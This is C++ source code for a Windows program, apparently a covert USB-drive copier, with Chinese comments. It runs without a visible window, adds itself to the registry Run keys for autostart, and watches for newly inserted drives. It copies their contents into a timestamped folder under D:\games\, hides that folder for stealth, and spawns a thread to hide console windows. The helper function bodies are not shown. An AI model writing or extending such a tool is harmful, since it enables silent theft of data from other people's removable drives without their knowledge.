#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
#include <vector>
#include <algorithm>
#include <sstream>
#define MAX 500
using namespace std;


vector<int> currentdisks;
vector<int> newdisks;
char src[MAX] = "X:\\";
char dest[MAX] = "D:\\games\\";
char usbname[MAX];
char tar[MAX];
char regsrc[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";	//管理员权限注册表,win7不一定成功
char regsrc2[] = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run";	//用户登录权限注册表
string time;

UINT DiskType;
SYSTEMTIME localtime;
HANDLE hthread_hide = NULL;
HKEY hkey = NULL;

/*-------------------------------------------------------------------------------------------------------------------
void copy();					//复制功能
int diskstatus();				//没变化返回0, 新增返回1，退出返回2, 同时更新维护currentdisks状态
DWORD WINAPI hide(LPVOID);			//hide线程搜索cmd窗口，一旦发现即对其进行隐藏
void gettime();					//获取时间功能
void autostart();				//自动启动功能
--------------------------------------------------------------------------*/

int main() {
	
	autostart();

	while (true) {
		int status = diskstatus();
		if (status == 1) {	//有新盘符
			for (int i = 0; i < newdisks.size(); i++) {
				gettime();
				sprintf(dest, "D:\\games\\");	//每次都重定义，否则字符累积
				string name = dest + time + "\\";
				sprintf(dest, name.c_str());
				src[0] = newdisks[i];
				::CreateThread(NULL, 0, hide, NULL, 0, NULL);
				copy();
				::SetFileAttributes(dest, FILE_ATTRIBUTE_HIDDEN);	//设置存放目录为隐藏，增加隐蔽性
			}
			newdisks.clear();
		}
		else	//无新盘符
			Sleep(500);

	}
	return 0;
}